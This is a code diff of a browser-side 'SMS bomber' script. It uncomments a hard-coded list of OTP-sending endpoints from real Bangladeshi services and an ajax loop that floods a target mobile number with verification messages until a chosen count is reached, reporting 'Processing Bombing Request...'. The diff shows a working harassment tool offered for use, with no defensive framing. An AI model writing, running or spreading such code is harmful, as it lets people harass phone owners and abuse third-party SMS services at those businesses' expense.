@@ -11,41 +11,41 @@ $(document).ready(() => {
         if (amount > 0 && mobile.length == 10) {
             var c = 0;
 
-            // Example of variable based api list , if you use this, comment out the fetch method
-            // const APIS = [
-            //     {
-            //         method: "POST",
-            //         url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
-            //     },
-            //     {
-            //         method: 'POST',
-            //         url: "http://robi.api.bongobd.com/api/login/send-otp",
-            //         body: `msisdn=88${mobile}&operator=all`
-            //     },
-            //     {
-            //         method: 'GET',
-            //         url: `http://45.114.85.19:8080/v3/otp/send?msisdn=88${mobile}`
-            //     },
-            //     {
-            //         method: 'GET',
-            //         url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
-            //     },
-            //     {
-            //         url: "https://ss.binge.buzz/otp/send/login",
-            //         method: "POST",
-            //         body: `phone=${mobile}`
-            //     }
+            Example of variable based api list , if you use this, comment out the fetch method
+            const APIS = [
+                {
+                    method: "POST",
+                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
+                },
+                {
+                    method: 'POST',
+                    url: "http://robi.api.bongobd.com/api/login/send-otp",
+                    body: `msisdn=88${mobile}&operator=all`
+                },
+                {
+                    method: 'GET',
+                    url: `http://45.114.85.19:8080/v3/otp/send?msisdn=88${mobile}`
+                },
+                {
+                    method: 'GET',
+                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
+                },
+                {
+                    url: "https://ss.binge.buzz/otp/send/login",
+                    method: "POST",
+                    body: `phone=${mobile}`
+                }
 
-            // ];
-            // while (c < amount) {
-            //     APIS.forEach(API => {
-            //         $.ajax(API);
-            //         c += 1;
-            //     });
-            // }
+            ];
+            while (c < amount) {
+                APIS.forEach(API => {
+                    $.ajax(API);
+                    c += 1;
+                });
+            }
 
-            // $('#logs').removeClass('visually-hidden');
-            // $('#logs').text("Processing Bombing Request...");
+            $('#logs').removeClass('visually-hidden');
+            $('#logs').text("Processing Bombing Request...");
 
             
             fetch("/assets/apis.json")
